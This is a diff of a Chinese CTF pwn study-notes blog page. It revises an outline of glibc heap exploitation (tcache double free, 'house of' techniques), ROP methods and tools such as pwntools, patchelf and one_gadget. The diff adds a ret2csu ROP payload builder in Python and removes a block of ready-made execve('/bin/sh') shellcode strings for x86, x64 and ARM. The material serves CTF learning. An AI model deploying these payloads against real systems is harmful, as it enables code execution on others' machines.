@@ -24,7 +24,7 @@
 <meta property="og:description" content="完善中">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-01-26T05:36:56.000Z">
-<meta property="article:modified_time" content="2024-01-27T13:16:02.224Z">
+<meta property="article:modified_time" content="2024-01-28T04:34:06.063Z">
 <meta property="article:author" content="nq0inaen">
 <meta property="article:tag" content="ALL">
 <meta name="twitter:card" content="summary_large_image">
@@ -236,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          18k 字
+          17k 字
         
       </span>
     
@@ -247,7 +247,7 @@
         
         
         
-          38 分钟
+          36 分钟
         
       </span>
     
@@ -290,7 +290,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年1月27日 晚上
+                    本文最后更新于：2024年1月28日 下午
                   
                 
               </p>
@@ -299,7 +299,7 @@
               <div class="markdown-body">
                 
                 <h2 id="前言">前言</h2>
-<p>更像是大纲了，不太全想到什么写什么</p>
+<p>更像是大纲，但也很不全，仅举出我所了解的</p>
 <h2 id="User-Mode">User Mode</h2>
 <p>一般都是给个linux二进制文件，题目预先设计好了某个漏洞，然后你能利用漏洞，达成任意地址读/写，控制程序流，达成getshell或orw读flag什么的</p>
 <p>一般做题步骤：</p>
@@ -383,7 +383,7 @@ fastbin在free时只会检查现在释放的chunk，是不是开头的chunk，�
 并在在fastbin取出时，会检查size字段是不是属于这个fastbin，因此往往需要伪造一个size</li>
 <li>glibc2.27~glibc2.28，主要是tcache double free<br>
 相较于fastbin double free，tcache完全没有任何检查，只需要free(C1), free(C1)就可以构造一个环出来</li>
-<li>glibc2.29～glibc2.3X，tcache加入了检查机制,编辑free后的堆绕过的doublefree检测</li>
+<li>glibc2.29～glibc2.3X，tcache加入了检查机制</li>
 </ul>
 <h6 id="检测：">检测：</h6>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> tc_idx = csize2tidx(size);<br><span class="hljs-comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span><br><span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  <span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>  tcache_entry *e = (tcache_entry *)chunk2mem(p);<br> <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span><br><span class="hljs-comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//剪枝</span><br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>        malloc_printerr(<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>  &#125;<br> <br>  <span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="hljs-comment">//通过检查，放入tcahce中</span><br>  &#123;<br>    tcache_put(p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -473,9 +473,15 @@ fastbin在free时只会检查现在释放的chunk，是不是开头的chunk，�
 ret相当于汇编pop eip;</p>
 </blockquote>
 <h4 id="ret2shellcode">ret2shellcode</h4>
+<p>shellcode要写在可以执行的段，控制程序流执行它</p>
 <h4 id="ret2libc">ret2libc</h4>
 <h4 id="ret2csu">ret2csu</h4>
+<p>简单来说就是利用libc_csu_init中的两段代码片段来实现(rdi,rsi,rdx)3个参数的传递（间接性的传递参数）</p>
+<p>x64 下的 __libc_csu_init 这个函数是用来对 libc 进行初始化操作的，而一般的程序用 libc 函数，所以这个函数一定会存在。</p>
+<p>(不同版本的这个函数有一定的区别，需要对下面的payload略作修改)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,function</span>):<br>    csu_front_addr=<span class="hljs-number">0x400740</span><br>    csu_end_addr=<span class="hljs-number">0x40075A</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
 <h4 id="ret2dl-resolve">ret2dl_resolve</h4>
+<p>一般是栈迁移到bss段伪造fake_linkmap结构体欺骗程序执行system(“/bin/sh”)</p>
 <ul>
 <li>用于应对只能溢出0x10字节的情况</li>
 <li>保护不能开启FULL RELRO</li>
@@ -483,8 +489,6 @@ ret相当于汇编pop eip;</p>
 <li>pwntools有Ret2dlresolvePayload模块</li>
 </ul>
 <h3 id="Heap-Exploitation">Heap Exploitation</h3>
-<p>下面的堆利用手法都是基于ptmalloc2</p>
-<p>一般给漏洞像，堆溢出，off-by-one，off-by-null，或者uaf，看你怎么利用了</p>
 <h4 id="realloc-malloc-calloc区别">realloc/malloc/calloc区别</h4>
 <ul>
 <li>
@@ -492,7 +496,7 @@ ret相当于汇编pop eip;</p>
 <blockquote>
 <p>void* malloc (size_t size);</p>
 </blockquote>
-<p>根据size来申请内存</p>
+<p>根据size来申请内存，使用ptmalloc进行内存管理</p>
 </li>
 <li>
 <p>realloc</p>
@@ -517,28 +521,27 @@ malloc_usable_size(realloc_ptr) &lt; size， 这个时候才是malloc一块更�
 </li>
 </ul>
 <h4 id="Chunk-Extend-and-Overlapping">Chunk Extend and Overlapping</h4>
-<p>熟知堆结构的前提下，运用堆风水技巧伪造堆块</p>
 <h4 id="Unlink">Unlink</h4>
 <h4 id="Fastbin-Attack">Fastbin Attack</h4>
 <h4 id="Unsorted-Bin-Attack">Unsorted Bin Attack</h4>
 <h4 id="Large-Bin-Attack">Large Bin Attack</h4>
-<p>高版本可以说这个是大放异彩</p>
 <h4 id="Tcache-attack">Tcache attack</h4>
 <h4 id="Tcache-Stashing-Unlink-Attack">Tcache-Stashing-Unlink-Attack</h4>
 <h4 id="House">House</h4>
-<h5 id="House-Of-Force">House Of Force</h5>
-<h5 id="House-of-Orange">House of Orange</h5>
-<h5 id="House-of-Roman">House of Roman</h5>
-<p>fastbin attack 和 Unsortbin attack 结合的一个小 trick。</p>
-<h5 id="House-of-Pig">House of Pig</h5>
-<h5 id="House-of-banana">House of banana</h5>
-<h5 id="House-of-Corrosion">House of Corrosion</h5>
-<h5 id="House-of-emma">House of emma</h5>
-<h5 id="House-of-wiki">House of wiki</h5>
-<h5 id="House-of-cat">House of cat</h5>
-<h5 id="House-of-apple">House of apple</h5>
+<p><code>Glibc</code> 的 <code>house of</code> 系列攻击手法基于都是围绕着堆利用和 <code>IO FILE</code> 利用。可以跟着<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">how2heap</a>进行学习，这里列举一些我所知道的</p>
+<p><strong>House Of Force</strong></p>
+<p><strong>House of Orange</strong></p>
+<p><strong>House of Roman</strong></p>
+<p><strong>House of Pig</strong></p>
+<p><strong>House of banana</strong></p>
+<p><strong>House of Corrosion</strong></p>
+<p><strong>House of emma</strong></p>
+<p><strong>House of wiki</strong></p>
+<p><strong>House of apple</strong></p>
+<p><a target="_blank" rel="noopener" href="https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#2-house-of%E7%B3%BB%E5%88%97">Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.github.io)</a></p>
 <h3 id="shellcode">shellcode</h3>
-<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"># <span class="hljs-number">32</span>位 短字节shellcode <span class="hljs-comment">--&gt; 21字节</span><br><br>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80<br><br># <span class="hljs-number">32</span>位 纯ascii字符shellcode<br><br>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA<br><br># <span class="hljs-number">32</span>位 scanf可读取的shellcode<br><br>\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh<br><br># <span class="hljs-number">64</span>位 scanf可读取的shellcode <span class="hljs-number">22</span>字节<br><br>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05<br><br># <span class="hljs-number">64</span>位 较短的shellcode  <span class="hljs-number">23</span>字节<br><br>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05<br><br># <span class="hljs-number">64</span>位 纯ascii字符shellcode<br><br>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t<br><br>#<span class="hljs-number">32</span>位arm架构shellcode <span class="hljs-number">22</span>字节<br>shellcode=<span class="hljs-string">&quot;\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span><br></code></pre></td></tr></table></figure>
+<p>太强了，膜拜</p>
+<p><a target="_blank" rel="noopener" href="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/">Linux下的shellcode技巧总结 - roderick - record and learn! (roderickchan.github.io)</a></p>
 <h3 id="ORW">ORW</h3>
 <h3 id="Tools">Tools</h3>
 <h4 id="IDA-Pro">IDA Pro</h4>
@@ -638,7 +641,8 @@ malloc_usable_size(realloc_ptr) &lt; size， 这个时候才是malloc一块更�
 </li>
 </ul>
 <h4 id="pwntools">pwntools</h4>
-<p>必备的库，会用它的很多有用的模块可以大大加快编写exp的速度</p>
+<p>必备的库，会用它可以大大加快编写exp的速度</p>
+<p>要充分了解它的许多有用模块可从<a target="_blank" rel="noopener" href="http://docs.pwntools.com/">官方文档</a>着手</p>
 <h4 id="seccomp-tools">seccomp-tools</h4>
 <p>Secommp (SECure COMPuting) 是 Linux 内核 2.6.12 版本引入的安全模块，主要是用来限制某一进程可用的系统调用 (system call)。</p>
 <p>我们可以用这个工具来可以分析程序的seccomp状态，看禁用了哪些系统调用</p>
@@ -646,7 +650,9 @@ malloc_usable_size(realloc_ptr) &lt; size， 这个时候才是malloc一块更�
 <h4 id="patchelf">patchelf</h4>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --replace-needed libc.so.6 你要换的libc的硬路径 ./pwn<br>patchelf --set-interpreter ld的硬路径 ./pwn<br></code></pre></td></tr></table></figure>
 <h4 id="one-gadget">one_gadget</h4>
+<p>可以用来寻找万能的gadget去getshell</p>
 <p>可以设置参数查找等级，找到更多可用的gadget</p>
+<p>例：<code>one_gadget ./libc-2.27.so -l 1</code> 设置等级level1</p>
 <h4 id="glibc-all-in-one">glibc-all-in-one</h4>
 <h2 id="Kernel-Mode">Kernel Mode</h2>
 <h3 id="常用结构体">常用结构体</h3>
@@ -728,12 +734,11 @@ rdx=0 or 地址-&gt;0</p>
 <p>最好学这个机制就是去看它的源码</p>
 <h3 id="More">More</h3>
 <h2 id="参考">参考</h2>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177832#h2-0">Canary保护详解和常用Bypass手段-安全客 - 安全资讯平台 (anquanke.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177520">PIE保护详解和常用bypass手段-安全客 - 安全资讯平台 (anquanke.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">Environment - CTF Wiki (ctf-wiki.org)</a></p>
 <p><a target="_blank" rel="noopener" href="https://lantern.cool/note-pwn-linux-protect/">Linux 常用保护机制 | Lantern’s 小站</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/murkuo/p/15965270.html">pwndbg 基本操作指令 - MuRKuo - 博客园 (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解_glibc 2.31下存在doublefree吗-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/130426404">CTF-pwn pwntools用法探索</a></p>
 
                 
               </div>
@@ -798,7 +803,7 @@ rdx=0 or 地址-&gt;0</p>
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年1月27日</div>
+          <div>2024年1月28日</div>
         </div>
       
       
